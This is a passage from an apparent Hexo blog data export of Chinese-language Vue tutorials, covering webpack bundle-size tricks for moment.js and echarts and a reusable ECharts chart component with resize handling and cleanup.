rel=\"noopener\">优化方案</a>为例讲下。</p>\n<p>整体思路为两种，一种是先忽略整体语言包，然后业务层面引入特定的语言包文件；另一种是直接指定打包哪些语言文件。主要会用到 webpack 的两个内置插件 <code>IgnorePlugin</code> 和 <code>ContextReplacementPlugin</code>。</p>\n<p>一，IgnorePlugin 的使用</p>\n<p>移除所有语言包</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// vue.config.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> webpack = <span class=\"built_in\">require</span>(<span class=\"string\">\"webpack\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  configureWebpack: &#123;</span><br><span class=\"line\">    plugins: [</span><br><span class=\"line\">      <span class=\"comment\">// Ignore all locale files of moment.js</span></span><br><span class=\"line\">      <span class=\"keyword\">new</span> webpack.IgnorePlugin(<span class=\"regexp\">/^\\.\\/locale$/</span>, /moment$/)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>在需要的地方引入需要的语言包</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- src/App.vue --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> moment <span class=\"keyword\">from</span> <span class=\"string\">\"moment\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> <span class=\"string\">\"moment/locale/zh-cn\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"string\">\"$route.query.locale\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        moment.locale(val === <span class=\"string\">\"en_US\"</span> ? <span class=\"string\">\"en\"</span> : <span class=\"string\">\"zh-cn\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>二，ContextReplacementPlugin 的使用</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> webpack = <span class=\"built_in\">require</span>(<span class=\"string\">\"webpack\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  configureWebpack: &#123;</span><br><span class=\"line\">    plugins: [</span><br><span class=\"line\">      <span class=\"comment\">// load `moment/locale/zh-cn.js`</span></span><br><span class=\"line\">      <span class=\"keyword\">new</span> webpack.ContextReplacementPlugin(<span class=\"regexp\">/moment[/\\\\]locale$/</span>, /zh-cn/)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这样在你需要的地方就不用单独引入语言包了</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- src/App.vue --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> moment <span class=\"keyword\">from</span> <span class=\"string\">\"moment\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"comment\">// import \"moment/locale/zh-cn\";</span></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"string\">\"$route.query.locale\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        moment.locale(val === <span class=\"string\">\"en_US\"</span> ? <span class=\"string\">\"en\"</span> : <span class=\"string\">\"zh-cn\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"echarts-优化\"><a href=\"#echarts-优化\" class=\"headerlink\" title=\"echarts 优化\"></a>echarts 优化</h3><p>由整体引入 echarts 包改成按需引入。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 整体引入：</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> echarts <span class=\"keyword\">from</span> <span class=\"string\">\"echarts\"</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 按需引入：</span></span><br><span class=\"line\"><span class=\"comment\">// 核心功能包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> echarts <span class=\"keyword\">from</span> <span class=\"string\">\"echarts/lib/echarts\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 用到的柱状图功能包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"echarts/lib/chart/bar\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 标题功能包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"echarts/lib/component/title\"</span>;</span><br></pre></td></tr></table></figure>\n<p>经过以上三个模块的优化之后，报告图如下：<br><img src=\"/vue-in-action-bundle/report1.jpg\" alt=\"优化后报告图\"><br>优化前后大小对比：<br><img src=\"/vue-in-action-bundle/size0.jpg\" alt=\"优化前\"><br><img src=\"/vue-in-action-bundle/size1.jpg\" alt=\"优化后\"></p>\n<h2 id=\"webpack-性能优化——DLL\"><a href=\"#webpack-性能优化——DLL\" class=\"headerlink\" title=\"webpack 性能优化——DLL\"></a>webpack 性能优化——DLL</h2><p><a href=\"https://www.cnblogs.com/ghost-xyx/p/6472578.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ghost-xyx/p/6472578.html</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@组件中使用ECharts","date":"2019-05-21T12:03:17.000Z","updated":"2019-05-21T12:03:17.000Z","_content":"\n# 概述\n\nECharts 是一个流行的成熟的数据图表库，想在 vue 组件中使用，可以使用社区提供的封装好的 vue-eacharts 库，不过还是推荐自己分装，因为简单可靠。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 跑起来\n\n根据[官方文档](https://echarts.baidu.com/tutorial.html#%E5%9C%A8%20webpack%20%E4%B8%AD%E4%BD%BF%E7%94%A8%20ECharts)，安装完 echarts 之后，只需简单的创建个组件文件 Chart.vue，然后在 mounted 的时候初始化 echarts 实例，然后在需要的页面注册使用即可使用。\n\n### 创建 Chart 组件\n\n```html\n<template>\n  <div ref=\"myChart\"></div>\n</template>\n```\n\n```js\nimport echarts from \"echarts\";\nexport default {\n  mounted() {\n    // 基于准备好的dom，初始化echarts实例\n    var myChart = echarts.init(this.$refs.myChart);\n    // 绘制图表\n    myChart.setOption({\n      title: {\n        text: \"ECharts 入门示例\"\n      },\n      tooltip: {},\n      xAxis: {\n        data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n      },\n      yAxis: {},\n      series: [\n        {\n          name: \"销量\",\n          type: \"bar\",\n          data: [5, 20, 36, 10, 10, 20]\n        }\n      ]\n    });\n  }\n};\n```\n\n### 使用 Chart 组件\n\n```html\n<template>\n  <div>\n    <Chart style=\"height:400px\" />\n  </div>\n</template>\n```\n\n```js\nimport Chart from \"../../components/Chart\";\nexport default {\n  components: {\n    Chart\n  }\n};\n```\n\n## 实际使用\n\n需要解决三个问题：一是窗口大小改变的时候图表需要重新渲染；二是引用第三方库需要及时的销毁，访问内存溢出；三是数据应该由父级传入。\n\n```js\nimport debounce from \"lodash/debounce\";\nimport echarts from \"echarts\";\nimport { addListener, removeListener } from \"resize-detector\";\nexport default {\n  props: {\n    option: {\n      type: Object,\n      default: () => {}\n    }\n  },\n  watch: {\n    option(val) {\n      this.chart.setOption(val);\n    }\n    // 深度复制，可以监听到option对象内部属性的变化，但是比较耗性能\n    // option: {\n    //   handler(val) {\n    //     this.chart.setOption(val);\n    //   },\n    //   deep: true\n    // }\n  },\n  created() {\n    this.resize = debounce(this.resize, 300);\n  },\n  mounted() {\n    this.renderChart();\n    // 监听dom变化，及时重新渲染eacharts实例\n    addListener(this.$refs.myChart, this.resize);\n  },\n  beforeDestroy() {\n    // 销毁eacharts实例\n    removeListener(this.$refs.myChart, this.resize);\n    this.chart.dispose();\n    this.chart = null;\n  },\n  methods: {\n    resize() {\n      console.log(\"resize\");\n      // 重新渲染eacharts实例\n      this.chart.resize();\n    },\n    renderChart() {\n      // 基于准备好的dom，初始化echarts实例\n      this.chart = echarts.init(this.$refs.myChart);\n      // 绘制图表\n      this.chart.setOption(this.option);\n    }\n  }\n};\n```\n\n调用 Chart 组件\n\n```html\n<template>\n  <div>\n    <Chart :option=\"chartOption\" style=\"height: 400px;\" />\n  </div>\n</template>\n```\n\n```js\nimport random from \"lodash/random\";\nimport Chart from \"../../components/Chart\";\nimport { setInterval, clearInterval } from \"timers\";\nexport default {\n  data() {\n    return {\n      chartOption: {\n        title: {\n          text: \"ECharts 入门示例\"\n        },\n        tooltip: {},\n        xAxis: {\n          data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n        },\n        yAxis: {},\n        series: [\n          {\n            name: \"销量\",\n            type: \"bar\",\n            data: [5, 20, 36, 10, 10, 20]\n          }\n        ]\n      }\n    };\n  },\n  mounted() {\n    this.interval = setInterval(() => {\n      this.chartOption.series[0].data = this.chartOption.series[0].data.map(\n        () => random(100)\n      );\n      // 引用类型，重新创建对象才能保证Chart组件中监听option生效\n      this.chartOption = { ...this.chartOption };\n    }, 3000);\n  },\n  beforeDestroy() {\n    clearInterval(this.interval);\n  },\n  components: {\n    Chart\n  }\n};\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-echarts.md","raw":"---\ntitle: Vue实战@组件中使用ECharts\npermalink: vue-in-action-echarts\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-21 20:03:17\nupdated: 2019-05-21 20:03:17\n---\n\n# 概述\n\nECharts 是一个流行的成熟的数据图表库，想在 vue 组件中使用，可以使用社区提供的封装好的 vue-eacharts 库，不过还是推荐自己分装，因为简单可靠。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 跑起来\n\n根据[官方文档](https://echarts.baidu.com/tutorial.html#%E5%9C%A8%20webpack%20%E4%B8%AD%E4%BD%BF%E7%94%A8%20ECharts)，安装完 echarts 之后，只需简单的创建个组件文件 Chart.vue，然后在 mounted 的时候初始化 echarts 实例，然后在需要的页面注册使用即可使用。\n\n### 创建 Chart 组件\n\n```html\n<template>\n  <div ref=\"myChart\"></div>\n</template>\n```\n\n```js\nimport echarts from \"echarts\";\nexport default {\n  mounted() {\n    // 基于准备好的dom，初始化echarts实例\n    var myChart = echarts.init(this.$refs.myChart);\n    // 绘制图表\n    myChart.setOption({\n      title: {\n        text: \"ECharts 入门示例\"\n      },\n      tooltip: {},\n      xAxis: {\n        data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n      },\n      yAxis: {},\n      series: [\n        {\n          name: \"销量\",\n          type: \"bar\",\n          data: [5, 20, 36, 10, 10, 20]\n        }\n      ]\n    });\n  }\n};\n```\n\n### 使用 Chart 组件\n\n```html\n<template>\n  <div>\n    <Chart style=\"height:400px\" />\n  </div>\n</template>\n```\n\n```js\nimport Chart from \"../../components/Chart\";\nexport default {\n  components: {\n    Chart\n  }\n};\n```\n\n## 实际使用\n\n需要解决三个问题：一是窗口大小改变的时候图表需要重新渲染；二是引用第三方库需要及时的销毁，访问内存溢出；三是数据应该由父级传入。\n\n```js\nimport debounce from \"lodash/debounce\";\nimport echarts from \"echarts\";\nimport { addListener, removeListener } from \"resize-detector\";\nexport default {\n  props: {\n    option: {\n      type: Object,\n      default: () => {}\n    }\n  },\n  watch: {\n    option(val) {\n      this.chart.setOption(val);\n    }\n    // 深度复制，可以监听到option对象内部属性的变化，但是比较耗性能\n    // option: {\n    //   handler(val) {\n    //     this.chart.setOption(val);\n    //   },\n    //   deep: true\n    // }\n  },\n  created() {\n    this.resize = debounce(this.resize, 300);\n  },\n  mounted() {\n    this.renderChart();\n    // 监听dom变化，及时重新渲染eacharts实例\n    addListener(this.$refs.myChart, this.resize);\n  },\n  beforeDestroy() {\n    // 销毁eacharts实例\n    removeListener(this.$refs.myChart, this.resize);\n    this.chart.dispose();\n    this.chart = null;\n  },\n  methods: {\n    resize() {\n      console.log(\"resize\");\n      // 重新渲染eacharts实例\n      this.chart.resize();\n    },\n    renderChart() {\n      // 基于准备好的dom，初始化echarts实例\n      this.chart = echarts.init(this.$refs.myChart);\n      // 绘制图表\n      this.chart.setOption(this.option);\n    }\n  }\n};\n```\n\n调用 Chart 组件\n\n```html\n<template>\n  <div>\n    <Chart :option=\"chartOption\" style=\"height: 400px;\" />\n  </div>\n</template>\n```\n\n```js\nimport random from \"lodash/random\";\nimport Chart from \"../../components/Chart\";\nimport { setInterval, clearInterval } from \"timers\";\nexport default {\n  data() {\n    return {\n      chartOption: {\n        title: {\n          text: \"ECharts 入门示例\"\n        },\n        tooltip: {},\n        xAxis: {\n          data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n        },\n        yAxis: {},\n        series: [\n          {\n            name: \"销量\",\n            type: \"bar\",\n            data: [5, 20, 36, 10, 10, 20]\n          }\n        ]\n      }\n    };\n  },\n  mounted() {\n    this.interval = setInterval(() => {\n      this.chartOption.series[0].data = this.chartOption.series[0].data.map(\n        () => random(100)\n      );\n      // 引用类型，重新创建对象才能保证Chart组件中监听option生效\n      this.chartOption = { ...this.chartOption };\n    }, 3000);\n  },\n  beforeDestroy() {\n    clearInterval(this.interval);\n  },\n  components: {\n    Chart\n  }\n};\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-echarts","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xp006qwovv1t6lmu8x","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>ECharts 是一个流行的成熟的数据图表库，想在 vue 组件中使用，可以使用社区提供的封装好的 vue-eacharts 库，不过还是推荐自己分装，因为简单可靠。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"跑起来\"><a href=\"#跑起来\" class=\"headerlink\" title=\"跑起来\"></a>跑起来</h2><p>根据<a href=\"https://echarts.baidu.com/tutorial.html#%E5%9C%A8%20webpack%20%E4%B8%AD%E4%BD%BF%E7%94%A8%20ECharts\" target=\"_blank\" rel=\"noopener\">官方文档</a>，安装完 echarts 之后，只需简单的创建个组件文件 Chart.vue，然后在 mounted 的时候初始化 echarts 实例，然后在需要的页面注册使用即可使用。</p>\n<h3 id=\"创建-Chart-组件\"><a href=\"#创建-Chart-组件\" class=\"headerlink\" title=\"创建 Chart 组件\"></a>创建 Chart 组件</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"myChart\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> echarts <span class=\"keyword\">from</span> <span class=\"string\">\"echarts\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  mounted() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 基于准备好的dom，初始化echarts实例</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> myChart = echarts.init(<span class=\"keyword\">this</span>.$refs.myChart);</span><br><span class=\"line\">    <span class=\"comment\">// 绘制图表</span></span><br><span class=\"line\">    myChart.setOption(&#123;</span><br><span class=\"line\">      title: &#123;</span><br><span class=\"line\">        text: <span class=\"string\">\"ECharts 入门示例\"</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      tooltip: &#123;&#125;,</span><br><span class=\"line\">      xAxis: &#123;</span><br><span class=\"line\">        data: [<span class=\"string\">\"衬衫\"</span>, <span class=\"string\">\"羊毛衫\"</span>, <span class=\"string\">\"雪纺衫\"</span>, <span class=\"string\">\"裤子\"</span>, <span class=\"string\">\"高跟鞋\"</span>, <span class=\"string\">\"袜子\"</span>]</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      yAxis: &#123;&#125;,</span><br><span class=\"line\">      series: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          name: <span class=\"string\">\"销量\"</span>,</span><br><span class=\"line\">          type: <span class=\"string\">\"bar\"</span>,</span><br><span class=\"line\">          data: [<span class=\"number\">5</span>, <span class=\"number\">20</span>, <span class=\"number\">36</span>, <span class=\"number\">10</span>, <span class=\"number\">10</span>, <span class=\"number\">20</span>]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用-Chart-组件\"><a href=\"#使用-Chart-组件\" class=\"headerlink\" title=\"使用 Chart 组件\"></a>使用 Chart 组件</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">Chart</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height:400px\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Chart <span class=\"keyword\">from</span> <span class=\"string\">\"../../components/Chart\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  components: &#123;</span><br><span class=\"line\">    Chart</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"实际使用\"><a href=\"#实际使用\" class=\"headerlink\" title=\"实际使用\"></a>实际使用</h2><p>需要解决三个问题：一是窗口大小改变的时候图表需要重新渲染；二是引用第三方库需要及时的销毁，访问内存溢出；三是数据应该由父级传入。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> debounce <span class=\"keyword\">from</span> <span class=\"string\">\"lodash/debounce\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> echarts <span class=\"keyword\">from</span> <span class=\"string\">\"echarts\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; addListener, removeListener &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"resize-detector\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  props: &#123;</span><br><span class=\"line\">    option: &#123;</span><br><span class=\"line\">      type: <span class=\"built_in\">Object</span>,</span><br><span class=\"line\">      <span class=\"keyword\">default</span>: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  watch: &#123;</span><br><span class=\"line\">    option(val) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chart.setOption(val);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 深度复制，可以监听到option对象内部属性的变化，但是比较耗性能</span></span><br><span class=\"line\">    <span class=\"comment\">// option: &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//   handler(val) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     this.chart.setOption(val);</span></span><br><span class=\"line\">    <span class=\"comment\">//   &#125;,</span></span><br><span class=\"line\">    <span class=\"comment\">//   deep: true</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  created() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.resize = debounce(<span class=\"keyword\">this</span>.resize, <span class=\"number\">300</span>);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  mounted() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.renderChart();</span><br><span class=\"line\">    <span class=\"comment\">// 监听dom变化，及时重新渲染eacharts实例</span></span><br><span class=\"line\">    addListener(<span class=\"keyword\">this</span>.$refs.myChart, <span class=\"keyword\">this</span>.resize);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  beforeDestroy() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 销毁eacharts实例</span></span><br><span class=\"line\">    removeListener(<span class=\"keyword\">this</span>.$refs.myChart, <span class=\"keyword\">this</span>.resize);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.chart.dispose();</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.chart = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  methods: &#123;</span><br><span class=\"line\">    resize() &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">\"resize\"</span>);</span><br><span class=\"line\">      <span class=\"comment\">// 重新渲染eacharts实例</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chart.resize();</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    renderChart() &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 基于准备好的dom，初始化echarts实例</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chart = echarts.init(<span class=\"keyword\">this</span>.$refs.myChart);</span><br><span class=\"line\">      <span class=\"comment\">// 绘制图表</span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.chart.setOption(<span class=\"keyword\">this</span>.option);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>调用 Chart 组件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">Chart</span> <span class=\"attr\">:option</span>=<span class=\"string\">\"chartOption\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height: 400px;\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 